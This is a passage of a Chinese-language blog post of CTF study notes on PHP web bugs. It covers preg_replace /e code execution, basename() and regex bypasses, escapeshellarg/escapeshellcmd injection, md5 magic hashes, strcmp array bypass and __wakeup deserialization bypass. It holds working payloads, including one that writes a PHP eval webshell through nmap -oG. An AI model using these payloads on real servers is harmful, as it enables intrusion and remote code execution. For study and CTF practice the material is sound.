<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句: preg_replace(&#x27;/(&#x27; . $regex . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\1&quot;)&#x27;, $value);</span><br><span class="line">变成了语句: preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>

<p>​	但是，在 PHP 中对于传入的非法的 $_GET 数组参数名，会将其转换成下划线(比如 <code>.</code> )，所以我们要换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可执行函数。大佬给提供的payload为：<em><em>\S</em>&#x3D;${phpinfo()}</em>*</p>
<p>​	在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong></p>
<p>​	利用定义的getFlag函数执行命令：**?\S*&#x3D;${getflag()}&amp;cmd&#x3D;system(‘ls’);** 查找到 flag的位置即可</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">preg_replace与代码执行 </a></p>
<h2 id="basename-绕过正则"><a href="#basename-绕过正则" class="headerlink" title="basename()绕过正则"></a>basename()绕过正则</h2><p>​	basename()：返回路径中的文件名部分，语法：<strong>basename(path,suffix)</strong></p>
<blockquote>
<p>path：必需，规定要检查的路径</p>
<p>suffix：可选，规定文件扩展名（如果文件有 suffix，则不会输出这个扩展名）</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$path</span> = <span class="string">&quot;/test/home.php&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>);		<span class="comment">//显示带有文件扩展名的文件名 home.php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>,<span class="string">&quot;.php&quot;</span>);<span class="comment">//显示不带有文件扩展名的文件名 home</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	<strong>绕过原理</strong> ：在使用默认语言环境设置时，basename()会删除文件名开头的非 ASCII 字符(大致意思是这个)出自：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=62119">basename broken with non-ASCII-chars</a>报告</p>
<p>用脚本跑一下测试有哪些字符会被basename()删除 <a target="_blank" rel="noopener" href="https://darkwing.moe/2020/03/10/Can-you-guess-it-zer0pts-CTF-2020/?utm_source=tuicool&utm_medium=referral">脚本来源</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="number">255</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="string">&#x27;/index.php/config.php/&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">check</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$t</span> = <span class="title function_ invoke__">basename</span>(<span class="string">&#x27;/index.php/config.php/&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;$&#123;i&#125;: $&#123;t&#125;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	发现ASCII码值为128-255 的字符均可以绕过basename()，所以可以利用 <strong>这些不可见字符污染字符串</strong> 来绕过basename()，看了别人的WP知道还有 <strong>中文字符</strong> 也可以绕过也可以绕过，例如：<strong>汉字、？、《、》、；</strong>等中文字符</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/15429527.html">basename()绕过小结</a></p>
<p>**[Zer0pts2020]Can you guess it?**：</p>
<p>​	查看源码发现flag就在 config.php 中，先利用 basename 函数来显示 config.php页面，如：<code>/index.php/config.php</code> ；之后就是绕过正则表达式，正则匹配了 <code>config.php/</code> ，所以我们要在其后面加上 不可见字符污染字符串，如：config.php&#x2F;%ff（%80~%ff都可以，十六进制），最后点击 <strong>Source</strong> 即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-10.jpg" alt="002-php-10"></p>
<h2 id="escapeshell-arg-cmd"><a href="#escapeshell-arg-cmd" class="headerlink" title="escapeshell(arg+cmd)"></a>escapeshell(arg+cmd)</h2><p>​	这两个函数单独出现的话不会有影响，可如果他们一起使用的话就会出现一些问题</p>
<ul>
<li><p>escapeshellarg：把字符串转义为可以在 shell 命令里使用的参数</p>
<p>​	给字符串整体加一个单引号并且引用或转义任何已经存在的单引号（即若字符串中有单引号时先对单引号转义，再用单引号将左右两部分括起来）</p>
</li>
<li><p>escapeshellcmd：转义 字符串中可能会欺骗 shell 执行任意命令的字符</p>
<p>\x0A \xFF &amp; # ;&#96;|*?~&lt;&gt;^()[]{}$\ 这些字符会被转义，’ 和 “ 仅在不配对时被转义</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;curl &quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>传入的参数是：<code>127.0.0.1&#39; -v -d a=1</code></p>
</li>
<li><p>经过 escapeshellarg 处理后变成了 <code>&#39;127.0.0.1&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用</p>
</li>
<li><p>经过 escapeshellcmd 处理后变成 <code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，escapeshellcmd对 \ 和最后那个<strong>不配对的引号</strong>进行了转义</p>
</li>
<li><p>最后执行的命令是 <code>curl &#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于 <code>\\</code> 被解释为 \ 而不是转义字符，所以后面的 ‘ 没有被转义，与再后面的 ‘ 配对成了一个空白连接符</p>
<blockquote>
<p>-d, –data <data>          HTTP POST data</p>
<p>所以等价为 <code>curl 127.0.0.1\ -v -d a=1&#39;</code>，先向127.0.0.1\发起请求，再用 POST方式传参a&#x3D;1’</p>
<p>简单的来说就是没有考虑到单引号的问题，两次转义后出现了问题</p>
</blockquote>
</li>
</ol>
<p><strong>[BUUCTF 2018]Online Tool 1</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);	<span class="comment">//用于创建目录</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);	<span class="comment">//改变当前目录</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure>

<p>​	nmap有一个参数 -oG 可以实现将命令和结果写到文件，所以我们可以控制自己的输入写入文件，所以我们可以写入一句话木马，构造的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>

<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇 </a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2501#toc-1">代码审计Day5 - escapeshellarg与escapeshellcmd使用不当</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/100711933">BUUCTF 2018 Online Tool</a></p>
<h1 id="弱类型绕过"><a href="#弱类型绕过" class="headerlink" title="弱类型绕过"></a>弱类型绕过</h1><p>​	弱类型是可以随意转换变量的类型。也就是说 PHP 并不会验证变量的类型，可以随时地转换类型</p>
<p>&#x3D;&#x3D;：先将 前后两个变量的类型 转化相同，再比较</p>
<p>&#x3D;&#x3D;&#x3D;：先判断 前后两个变量的类型 是否相等，再比较</p>
<p>​	若比较 数字 和 字符串 或者 涉及到数字内容的字符串，则字符串会被转换成 数值 与 数字 进行比较。但是在php中 字符 或 字符串 不能转换成数字(会转换失败)。php中大概有三、四种方法将 字符串 转换成 数字：number_format()函数、直接进行类型转换、使用 intval()等函数转换、执行数学运算实现转换。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;123violet456&#x27;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">number_format</span>(<span class="variable">$a</span>),<span class="string">&quot;\n&quot;</span>;	<span class="comment">//123</span></span><br><span class="line">    <span class="keyword">echo</span> (<span class="keyword">int</span>)<span class="variable">$a</span>,<span class="string">&quot;\n&quot;</span>;		<span class="comment">//123</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>),<span class="string">&quot;\n&quot;</span>;	<span class="comment">//123</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	当一个字符串当作一个数值来取值，其结果和类型如下：如果该字符串没有包含 ’.’、’e’、’E’ 并且 数值在 int  的范围内，该字符串被当作 int 来取值，其余所有情况下都被作为 float 来取值。该字符串的开始部分决定了它的值，如果该字符串以合法的 数值 开始，则使用该数值， 否则其值为 0 (PHP规定)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;violet123&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="keyword">int</span>)<span class="variable">$a</span>,<span class="string">&quot;\n&quot;</span>;	<span class="comment">//0</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>),<span class="string">&quot;\n&quot;</span>;	<span class="comment">//0</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&quot;%53&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>);	<span class="comment">// 0    </span></span><br><span class="line">	<span class="comment">// 其余特殊符号除去 + - 外，转化成数字时都同上直接为0</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	也就是说 如果不是科学计数法形式的字符串，字符串只有两种方式 int 和 float 进行取值，以数字开头的话，只显示连续的数字其余字符不予显示；以字符开头的话，直接显示0 (特殊符号除 <code>+、-</code> 外也适用)</p>
<blockquote>
<p>若一个字符串为 合法数字 + e + 合法数字，将会解释为科学计数法</p>
<p>若一个字符串为 合法数字 + 非数字的字符串 ，将会被转换为该合法数字的值，后面的字符串将会被丢弃 </p>
<p>若一个字符串为 非数字的字符串 + 任意，则被转换为0 (除 + - 外)</p>
</blockquote>
<h2 id="md5相等绕过"><a href="#md5相等绕过" class="headerlink" title="md5相等绕过"></a><strong>md5相等绕过</strong></h2><p>​	0e 在比较的时候会将其视作为<strong>科学计数法</strong>，所以无论 0e 后面是什么，0的多少次方还是0，也就是说：md5(‘s878926199a’) &#x3D;&#x3D; md5(‘DQWRASX ‘)为真。以下是 md5值包含0e的 原字符串 及其md5值</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">s1836677006a</span><br><span class="line">	0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">	0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">	0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">	0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">	0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">	0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">	0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">240610708 </span><br><span class="line">	0e462097431906509019562988736854</span><br><span class="line">314282422 </span><br><span class="line">	0e990995504821699494520356953734</span><br><span class="line">571579406 </span><br><span class="line">	0e972379832854295224118025748221</span><br><span class="line">903251147 </span><br><span class="line">	0e174510503823932942361353209384</span><br><span class="line">1110242161 </span><br><span class="line">	0e435874558488625891324861198103</span><br><span class="line">1320830526 </span><br><span class="line">	0e912095958985483346995414060832</span><br><span class="line">1586264293 </span><br><span class="line">	0e622743671155995737639662718498</span><br><span class="line"></span><br><span class="line">QLTHNDT </span><br><span class="line">	0e405967825401955372549139051580</span><br><span class="line">QNKCDZO </span><br><span class="line">	0e830400451993494058024219903391</span><br><span class="line">EEIZDOI </span><br><span class="line">	0e782601363539291779881938479162</span><br><span class="line">TUFEPMC </span><br><span class="line">	0e839407194569345277863905212547</span><br><span class="line">UTIPEZQ </span><br><span class="line">	0e382098788231234954670291303879</span><br><span class="line">UYXFLOI </span><br><span class="line">	0e552539585246568817348686838809</span><br><span class="line">IHKFRNS </span><br><span class="line">	0e256160682445802696926137988570</span><br></pre></td></tr></table></figure>

<p>​	md5()无法处理数组，如果出现 强比较(&#x3D;&#x3D;&#x3D;) 的话，md5返回的值为False，使得 Flase&#x3D;&#x3D;&#x3D;False等式成立</p>
<p>当上述情况无法凑效时，用fastcoll 生成两个MD5值相同但内容不同的文件(URL编码后可以绕过md5强比较)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p test.txt -o 1.txt 2.txt</span><br><span class="line">		-p:给定需要计算的文件</span><br><span class="line">		-o:指定输出到两个文件中(可以不写)</span><br><span class="line">直接将需计算的文件拖到 fastcoll_v1.0.0.5.exe 也可执行	</span><br></pre></td></tr></table></figure>

<p>以下是md5值前后相等的,即 a&#x3D;md5(a)这种类型的(a代表原始的值)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">	0e291242476940776845150308577824</span><br></pre></td></tr></table></figure>

<h2 id="strcmp绕过"><a href="#strcmp绕过" class="headerlink" title="strcmp绕过"></a>strcmp绕过</h2><blockquote>
<p>适用版本：PHP≤5.3</p>
</blockquote>
<p>​	<code>strcmp($str1,$str2)</code> ，比较字符串的函数，相等则返回0，在5.3之前，若传入的是数组就会报错，并且return 0，而相等返回的结果也是0，所以我们可以用<strong>数组</strong>进行绕过</p>
<p><strong>[极客大挑战 2019]BuyFlag</strong>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-04.jpg"></p>
<p>​	这里貌似用到了 strcmp函数限制了变量的长度，不允许输入太长的字符串，而money不够却又买不到flag</p>
<ul>
<li>可以用 科学计数法绕过： <code>money=1e9</code>，表示 1x10⁹</li>
<li>也可以用 数组绕过：<code>money[]=1</code></li>
</ul>
<h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><ol>
<li><p>对象：系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位</p>
<p>对象 的抽象是 类，类 的具体化就是 对象，也可以说类的实例是对象（实际存在的）</p>
</li>
<li><p>类：具有相同特性（数据元素）和行为（功能）的一组对象的集合</p>
<p>一种数据类型，它定义了一个 对象 的属性和方法，类具有属性，是 对象 状态的抽象（一种概念）</p>
</li>
</ol>
<p>将 类名 与 变量名 以字符串的形式保存起来，反序列化 就是其逆过程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span> , <span class="string">&#x27;pass&#x27;</span> =&gt; <span class="string">&#x27;pass&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);	<span class="comment">//将这个 数组 序列化 a:1:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line">=====================================================================================</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span>																				</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个 对象 序列化 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span></span><br><span class="line">=====================================================================================</span><br><span class="line"></span><br><span class="line"><span class="comment">//	O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;		a:1:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"><span class="comment">//	对象类型:长度:&quot;类名&quot;:类中变量的个数:&#123;类型:长度:&quot;值&quot;;类型:长度:&quot;值&quot;;......&#125;</span></span><br><span class="line"><span class="comment">//	对象类型:a-array数组		O-class		s-string字符串类型</span></span><br></pre></td></tr></table></figure>

<p>当 字符串 反序列化出现问题时，可以加上base64_encode()</p>
<p>当 <strong>private</strong> 声明的字段在序列化时：</p>
<ul>
<li>private声明的字段为私有字段，只在所声明的类中可见，在 该类的子类 和 该类的对象实例 中均不可见</li>
<li>故私有字段的字段名在序列化时， 类名 和 字段名 前面加上 <code>%00</code> </li>
<li><strong>protected</strong> 声明的字段要在 字段名 前加上 <code>%00*</code> (字段名：类下声明的变量)</li>
</ul>
<p>常见 PHP 魔术方法</p>
<blockquote>
<p><code>__construct()</code> ：当类新建对象的时候会执行，例如，$x &#x3D; new Demo(要传给函数的值)<br><code>__destruct()</code> ：当对象销毁后会调用（也就是说 此函数在最后被调用）<br><code>__wakeup()</code> ：当执行反序列化函数的时候会先执行wakeup函数<br><code>highlight_file()</code> ：高亮显示指定PHP文件的代码</p>
<p><code>__invoke()</code>：在类的对象被调用为函数时候，自动被调用<br><code>__toString()</code>：在类的对象被当作字符串操作的时候，自动被调用<br><code>__wakeup()</code> ：在类的对象反序列化的时候，自动被调用<br><code>__construct()</code>：在类的对象实例化之前，自动被调用<br><code>__get()</code>：从不可访问的属性中读取数据会触发（访问类中一个不存在的属性时自动调用）</p>
</blockquote>
<h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup()绕过"></a>__wakeup()绕过</h2><p>​	当 反序列化 的时候，会检查是否存在 <code>__wakeup()</code>函数，如果存在的话，序列化之后优先调用此函数。</p>
<p>​	这个函数漏洞就是与<strong>对象的属性个数</strong>有关。如果序列化后的字符串中 表示属性个数的数字与真实属性个数一致，那么就调用 <code>__wakeup()函数</code>，如果 该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
<ul>
<li>简单来说，修改 对象的属性变量个数 即可（一般大于原数）</li>
</ul>
<p><strong>Web_php_unserialize：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; 	<span class="comment">//[oc]:匹配o c中的任意一个字符</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>=<span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$a</span>); <span class="comment">//绕过preg_match()函数</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$a</span>);  <span class="comment">//绕过__wakeup()函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>);          <span class="comment">//绕过解码函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	这里不能将 序列化后的 字符串 复制下来手动添加 <code>+</code> 和 改变对象属性个数再 base64 编码</p>
<p>​	用在线的PHP网站来反序列化后，输出乱码(可恶，VSCode上就可以)，或许可能与这有关(输出的字符串 并非 实际的字符串，虽然我也不太懂)<a target="_blank" rel="noopener" href="https://www.toolnb.com/tools/phpserialize.html">PHP序列化和反序列化 - 爱资料工具 </a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.staticaly.com/gh/Nikaid0/Imge/main/photo/000-00N/002/002-php-05.jpg"></p>
<p>​	<strong>var_dump()</strong> ：显示关于一个或多个表达式的结构信息。数组将递归展开值，通过缩进显示其结构</p>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>​	使用单个字符串来描述、匹配一系列符合某个句法规则的字符串</p>
